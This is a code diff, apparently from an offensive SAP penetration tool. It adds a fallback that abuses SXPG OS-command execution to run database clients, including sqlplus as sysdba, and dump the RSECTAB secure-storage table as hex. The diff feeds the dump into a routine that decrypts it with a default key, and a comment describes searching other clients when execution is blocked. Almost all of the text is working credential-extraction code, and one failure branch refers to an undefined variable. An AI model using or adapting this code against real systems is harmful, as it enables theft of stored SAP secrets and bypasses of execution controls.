@@ -541,6 +541,163 @@ def _read_ssfs_files_via_sxpg(node, creds) -> tuple:
     return key_bytes, dat_bytes
 
 
+def _read_rsectab_via_sxpg(node, creds) -> list | None:
+    """Read RSECTAB via direct database query through SXPG OS commands.
+
+    When RFC_ABAP_INSTALL_AND_RUN is blocked, uses execute_local_command()
+    to run the database CLI (hdbsql, sqlcmd, sqlplus, db2) and query
+    RSECTAB directly.  The SQL outputs IDENT and hex-encoded DATA per row
+    with a ~~~ delimiter.
+
+    Returns list of (ident, data_hex) tuples, or None if not possible.
+    """
+    db_type = (node.db_type or "").upper()
+    if not db_type:
+        print(f"[-] {node.sid}: Cannot read RSECTAB via SXPG — DB type unknown")
+        return None
+
+    sid = node.sid
+    is_windows = (node.os_type or "").lower() in ("windows", "win", "nt")
+
+    # Build a SQL SELECT that outputs IDENT~~~hex(DATA) per row.
+    # The hex encoding is database-specific:
+    #   HANA:    TO_VARCHAR(DATA, 'HEX')  or  BINTOHEX(DATA)
+    #   MSSQL:   CONVERT(VARCHAR(MAX), DATA, 2)
+    #   Oracle:  RAWTOHEX(DATA)
+    #   MaxDB:   HEX(DATA)
+    #   DB2:     HEX(DATA)
+    db_key = db_type
+    # SXPG splits params at spaces and mangles quotes.
+    # Strategy: call the DB CLI directly as EXTPROG with minimal params.
+    # Avoid double quotes in SQL — use single quotes only.
+
+    # SXPG LOG MESSAGE field truncates at ~128 chars per line.
+    # Strategy: run TWO queries — one for IDENT, one for hex(DATA).
+    # Then merge by row index.  The hex DATA (368 chars) gets truncated
+    # at 128 but we run a second query for the remaining part.
+
+    def _hdb_query(sql):
+        return sapmap_rfc.execute_local_command(
+            node, "hdbsql", f"-U DEFAULT -x {sql}", creds)
+
+    def _mss_query(sql):
+        return sapmap_rfc.execute_local_command(
+            node, "sqlcmd", f"-S localhost -h -1 -W -Q {sql}", creds)
+
+    def _ada_query(sql):
+        return sapmap_rfc.execute_local_command(
+            node, "sqlcli", f"-U DEFAULT {sql}", creds)
+
+    def _ora_query(sql):
+        return sapmap_rfc.execute_local_command(
+            node, "sqlplus", f"-S / as sysdba @/dev/stdin <<< {sql}", creds)
+
+    def _db2_query(sql):
+        return sapmap_rfc.execute_local_command(
+            node, "db2", sql, creds)
+
+    # Pick the right query function and SQL dialect
+    # 368 hex chars / 120 per chunk = 4 queries (ident + 3 hex chunks)
+    chunk = 120  # fits within 128-char SXPG line limit
+
+    if db_key in ("HDB", "HANA"):
+        run_q = _hdb_query
+        tbl = "RSECTAB"
+        hex_fn = "BINTOHEX(DATA)"
+        sub_fn = "SUBSTR"
+    elif db_key == "MSS":
+        run_q = _mss_query
+        tbl = f"[{sid}].[{sid}].[RSECTAB]"
+        hex_fn = "CONVERT(VARCHAR(400),DATA,2)"
+        sub_fn = "SUBSTRING"
+    elif db_key in ("ORA", "ORACLE"):
+        run_q = _ora_query
+        tbl = "SAPSR3.RSECTAB"
+        hex_fn = "RAWTOHEX(DATA)"
+        sub_fn = "SUBSTR"
+    elif db_key in ("ADA", "MAXDB", "ADABAS"):
+        run_q = _ada_query
+        tbl = "RSECTAB"
+        hex_fn = "RAWTOHEX(DATA)"
+        sub_fn = "SUBSTR"
+    elif db_key in ("DB6", "DB2"):
+        run_q = _db2_query
+        tbl = "RSECTAB"
+        hex_fn = "HEX(DATA)"
+        sub_fn = "SUBSTR"
+
+    else:
+        print(f"[-] {node.sid}: Unsupported DB type for SXPG RSECTAB: {db_type}")
+        return None
+
+    sql_ident = f"SELECT IDENT FROM {tbl}"
+    sql_chunks = [
+        f"SELECT {sub_fn}({hex_fn},1,{chunk}) FROM {tbl}",
+        f"SELECT {sub_fn}({hex_fn},{chunk+1},{chunk}) FROM {tbl}",
+        f"SELECT {sub_fn}({hex_fn},{chunk*2+1},{chunk}) FROM {tbl}",
+        f"SELECT {sub_fn}({hex_fn},{chunk*3+1}) FROM {tbl}",
+    ]
+
+    print(f"[*] {node.sid}: Reading RSECTAB via SXPG ({db_key} CLI)...")
+
+    # Run queries: IDENT + hex chunks
+    r_ident = run_q(sql_ident)
+    if not r_ident.get("success"):
+        print(f"[-] {node.sid}: SXPG RSECTAB IDENT query failed: "
+              f"{r_ident.get('error', '')}")
+        for line in r_ident.get("output", [])[:3]:
+            print(f"    {line[:120]}")
+        return None
+
+    chunk_results = [run_q(sql) for sql in sql_chunks]
+
+    # Parse output lines — strip header rows, quotes, pipes, whitespace
+    def _clean_lines(result):
+        lines = []
+        for line in result.get("output", []):
+            clean = line.strip().strip('"').strip("'")
+            # Strip MaxDB/sqlcli pipe delimiters: | value |
+            if clean.startswith("|") and clean.endswith("|"):
+                clean = clean[1:-1].strip()
+            elif clean.startswith("|"):
+                clean = clean[1:].strip()
+            # Skip header/separator lines
+            if not clean or clean.startswith("---") or clean.startswith("==="):
+                continue
+            if clean.upper().startswith(("IDENT", "BINTOHEX", "SUBSTR",
+                                         "RAWTOHEX", "HEX(", "CONVERT",
+                                         "SUBSTRING", "EXPRESSION")):
+                continue
+            if clean.startswith("*") or "rows selected" in clean.lower():
+                continue
+            lines.append(clean)
+        return lines
+
+    idents = _clean_lines(r_ident)
+    chunk_lines = [_clean_lines(r) if r.get("success") else []
+                   for r in chunk_results]
+
+    # Merge by row index — concatenate hex chunks per row
+    rows = []
+    for i, ident in enumerate(idents):
+        hex_parts = [cls[i].replace(" ", "").upper()
+                     if i < len(cls) else ""
+                     for cls in chunk_lines]
+        data_hex = "".join(hex_parts)
+        if ident and data_hex:
+            rows.append((ident.strip(), data_hex))
+
+    if rows:
+        print(f"[+] {node.sid}: Read {len(rows)} RSECTAB entries via SXPG ({db_key})")
+    else:
+        print(f"[-] {node.sid}: SXPG RSECTAB query returned no parseable rows")
+        for line in result.get("output", [])[:5]:
+            print(f"    {line[:120]}")
+        return None
+
+    return rows
+
+
 # ---------------------------------------------------------------------------
 # Public decrypt function
 # ---------------------------------------------------------------------------
@@ -855,11 +1012,18 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
 
     if rows is None:
         abap_blocked = True
+        # --- Step 2b: Try SXPG with direct DB query ---
         print(f"[*] {node.sid} client {creds.client}: "
-              f"ABAP exec unavailable, falling back to RFC_READ_TABLE")
+              f"ABAP exec unavailable, trying SXPG database query...")
+        rows = _read_rsectab_via_sxpg(node, creds)
+
+    if rows is None:
+        # --- Step 2c: RFC_READ_TABLE fallback (unreliable for RAW) ---
+        print(f"[*] {node.sid}: SXPG DB query failed, "
+              f"falling back to RFC_READ_TABLE")
         rows = _read_rsectab_via_rfc(node, creds)
 
-    # --- Step 2b: Client fallback if ABAP exec was blocked ---
+    # --- Step 2d: Client fallback if everything above failed ---
     if not rows and abap_blocked:
         print(f"[*] {node.sid}: Client {creds.client} blocks ABAP exec, "
               f"searching for open client...")
